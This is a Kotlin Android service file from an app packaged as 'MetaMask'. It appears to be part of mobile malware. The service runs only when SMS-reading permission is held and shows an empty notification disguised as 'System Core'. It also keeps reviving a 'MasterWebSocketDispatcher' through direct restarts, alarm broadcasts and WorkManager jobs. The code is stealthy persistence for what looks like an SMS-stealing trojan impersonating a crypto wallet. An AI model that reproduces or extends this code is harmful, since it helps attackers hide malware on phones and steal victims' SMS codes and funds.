package com.example.MetaMask.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.work.OneTimeWorkRequest
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import com.example.MetaMask.R
import com.example.MetaMask.receivers.AlarmReceiver
import kotlinx.coroutines.*

class PulseService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + Job())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[PulseService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        startForegroundAsShort()

        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
            stopSelf()
            android.util.Log.d("XDBG", "[PulseService] return") //xdbg
            return START_NOT_STICKY
        }

        scope.launch {
            try {
                checkAndResurrectMaster()
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[PulseService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            } finally {
                stopSelf()
            }
        }

        android.util.Log.d("XDBG", "[PulseService] return") //xdbg
        return START_NOT_STICKY
    }

    private fun startForegroundAsShort() {
        android.util.Log.d("XDBG", "[PulseService] startForegroundAsShort enter") //xdbg
        val channelId = "system_core_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (manager.getNotificationChannel(channelId) == null) {
                android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
                val channel = NotificationChannel(
                    channelId,
                    "System Core",
                    NotificationManager.IMPORTANCE_MIN
                )
                manager.createNotificationChannel(channel)
            }
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        if (Build.VERSION.SDK_INT >= 29) {
            android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
            try {
                ServiceCompat.startForeground(
                    this,
                    777,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[PulseService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                try {
                    startForeground(777, notification)
                } catch (e2: Exception) {
                    android.util.Log.e("XDBG", "[PulseService] catch ${e2.javaClass.simpleName}: ${e2.message}") //xdbg
                }
            }
        } else {
            startForeground(777, notification)
        }
    }

    private fun checkAndResurrectMaster() {
        android.util.Log.d("XDBG", "[PulseService] checkAndResurrectMaster enter") //xdbg
        if (!MasterWebSocketDispatcher.IS_SERVICE_RUNNING) {
            android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
            var directStartSuccess = false
            val context = applicationContext

            try {
                val masterIntent = Intent(context, MasterWebSocketDispatcher::class.java).apply {
                    putExtra("STARTED_FROM", "PULSE_CPR")
                }
                if (Build.VERSION.SDK_INT >= 26) {
                    android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
                    startForegroundService(masterIntent)
                } else {
                    startService(masterIntent)
                }
                directStartSuccess = true
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[PulseService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }

            if (!directStartSuccess) {
                android.util.Log.d("XDBG", "[PulseService] if branch") //xdbg
                try {
                    val alarmIntent = Intent(context, AlarmReceiver::class.java)
                    context.sendBroadcast(alarmIntent)
                } catch (e: Exception) {
                    android.util.Log.e("XDBG", "[PulseService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                }

                try {
                    val request = OneTimeWorkRequest.Builder(ServiceStarterWorker::class.java)
                        .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                        .addTag("PULSE_RECOVERY_JOB")
                        .build()
                    WorkManager.getInstance(context).enqueue(request)
                } catch (e: Exception) {
                    android.util.Log.e("XDBG", "[PulseService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
                }
            }
        }
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[PulseService] onDestroy enter") //xdbg
        super.onDestroy()
        scope.cancel()
    }
}
